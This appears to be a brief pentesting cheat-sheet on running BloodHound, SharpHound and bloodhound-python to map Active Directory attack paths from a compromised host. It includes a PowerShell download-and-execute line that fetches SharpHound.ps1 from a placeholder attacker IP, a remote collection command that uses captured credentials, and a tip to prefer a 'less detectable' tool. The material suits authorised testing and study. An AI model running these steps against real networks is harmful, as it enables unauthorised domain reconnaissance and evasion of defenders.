---
layout:     post
author:     0x5c4r3
type: docs
permalink: Ansible
---


<span style="font-size: 35px; color:red"><b>BloodHound</b></span>
&nbsp;
Start BloodHound

```bash
sudo neo4j console
```

```bash
./bloodhound --no-sandbox
```
&nbsp;

---
&nbsp;
<span style="font-size: 25px; color:white"><b>SharpHound</b></span>
Pull AD Configuration from pwned machine and load it into BloodHound
Copy _sharphound.exe_ in the pwned machine and run it from there
```shell
./SharpHound.exe -c all
```
It will create a .zip file that you can drag and drop into bloodhound

OR
```powershell
IEX(New-Object Net.WebClient).downloadString('http://<Kali_IP>/SharpHound.ps1')  
Invoke-BloodHound -CollectAll
```

Look for users that you pwned and use the suggestion box for 'shortest path from owned principles'
&nbsp;

---
&nbsp;
<span style="font-size: 25px; color:white"><b>BloodHound-Python</b></span>
If you have working credentials but no shell, you can use bloodhound-python from remote like so:
```shell
bloodhound-python -u <user> -p <password> -ns <IP> -d <DOMAIN> -c all
```
<span style="color:red">Give a try to rusthound, maybe it's faster and less detectable!</span>
